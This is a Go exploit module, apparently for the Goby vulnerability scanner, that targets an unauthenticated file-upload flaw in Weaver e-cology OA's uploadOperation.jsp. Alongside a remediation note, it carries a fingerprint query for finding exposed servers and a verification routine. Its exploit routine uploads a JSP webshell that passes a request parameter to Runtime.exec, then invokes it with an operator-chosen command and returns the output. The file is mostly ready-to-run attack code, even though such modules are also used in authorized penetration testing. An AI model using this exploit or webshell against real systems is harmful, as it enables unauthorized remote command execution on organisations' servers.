package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology OA uploadOperation.jsp file upload",
    "Description": "Weaver e-cology OA uploadOperation.jsp page file upload.",
    "Impact": "Weaver e-cology OA uploadOperation.jsp file upload",
    "Recommendation": "<p>1. Execute permission is disabled in the storage directory of uploaded files. </p><p>2. The file suffix whitelist. </p><p>3. Upgrade to the latest version. </p>",
    "Product": "Weaver-OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微oa前台无条件文件上传",
            "Description": "泛微eoffice系统是国内较为流行的OA系统，倡导移动协同 智慧办公，且功能齐全。此系统存在任意文件上传问题，存在较大的风险。",
            "Impact": "<p>泛微eoffice系统是国内较为流行的OA系统，倡导移动协同 智慧办公，且功能齐全。此系统存在任意文件上传问题，存在较大的风险。<br></p><p>该系统存在文件上传漏洞，该漏洞导致黑客可以上传恶意文件到服务器，获取服务器权限。</p>",
            "Recommendation": "<p>1、上传文件的存储目录禁用执行权限。</p><p>2、文件的后缀白名单。</p><p>3、升级至最新版本。</p>",
            "Product": "泛微-协同办公OA",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology OA uploadOperation.jsp file upload",
            "Description": "Weaver e-cology OA uploadOperation.jsp page file upload.",
            "Impact": "Weaver e-cology OA uploadOperation.jsp file upload",
            "Recommendation": "<p>1. Execute permission is disabled in the storage directory of uploaded files. </p><p>2. The file suffix whitelist. </p><p>3. Upgrade to the latest version. </p>",
            "Product": "Weaver-OA",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "GobyQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "Author": "itardc@163.com",
    "Homepage": "http://www.weaver.com.cn/",
    "DisclosureDate": "2021-04-09",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Weaver-OA"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10179"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFilename := goutils.RandomHexString(6)
			vulUri := "/page/exportImport/uploadOperation.jsp"
			cfg := httpclient.NewPostRequestConfig(vulUri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryULRwuFJuwpBsC7H4")
			cfg.Header.Store("Cookie", "ecology_JSessionid=aaa8XwWbCjviFcvq3-_ex; JSESSIONID=aaa8XwWbCjviFcvq3-_ex; ecology_JSessionId=aaa8XwWbCjviFcvq3-_ex; __randcode__=c468b69e-fb20-493f-9295-fc64f8974908; loginidweaver=1; languageidweaver=7; loginuuids=1")
			cfg.Data = "------WebKitFormBoundaryULRwuFJuwpBsC7H4\r\n"
			cfg.Data += fmt.Sprintf("Content-Disposition: form-data; name=\"upfile\"; filename=\"%s.txt\"\r\n", randomFilename)
			cfg.Data += "Content-Type: application/octet-stream\r\n\r\n"
			cfg.Data += "hello, world\r\n"
			cfg.Data += "------WebKitFormBoundaryULRwuFJuwpBsC7H4--"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + fmt.Sprintf("/page/exportImport/fileTransfer/%s.txt", randomFilename)); err == nil &&
					resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "hello, world") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			randomFilename := goutils.RandomHexString(6)
			webshell := "<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"vulgo\")).getInputStream();"
			webshell += "int a = -1;"
			webshell += "byte[] b = new byte[2048];"
			webshell += "while((a=in.read(b))!=-1){out.println(new String(b));}"
			webshell += "%>"
			vulUri := "/page/exportImport/uploadOperation.jsp"
			cfg := httpclient.NewPostRequestConfig(vulUri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryULRwuFJuwpBsC7H4")
			cfg.Header.Store("Cookie", "ecology_JSessionid=aaa8XwWbCjviFcvq3-_ex; JSESSIONID=aaa8XwWbCjviFcvq3-_ex; ecology_JSessionId=aaa8XwWbCjviFcvq3-_ex; __randcode__=c468b69e-fb20-493f-9295-fc64f8974908; loginidweaver=1; languageidweaver=7; loginuuids=1")
			cfg.Data = "------WebKitFormBoundaryULRwuFJuwpBsC7H4\r\n"
			cfg.Data += fmt.Sprintf("Content-Disposition: form-data; name=\"upfile\"; filename=\"%s.jsp\"\r\n", randomFilename)
			cfg.Data += "Content-Type: application/octet-stream\r\n\r\n"
			cfg.Data += webshell + "\r\n"
			cfg.Data += "------WebKitFormBoundaryULRwuFJuwpBsC7H4--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/page/exportImport/fileTransfer/%s.jsp?vulgo=%s", randomFilename, cmd)); err == nil && resp.StatusCode == 200 {
					fmt.Println(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/%s.jsp?vulgo=%s", randomFilename, cmd))
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
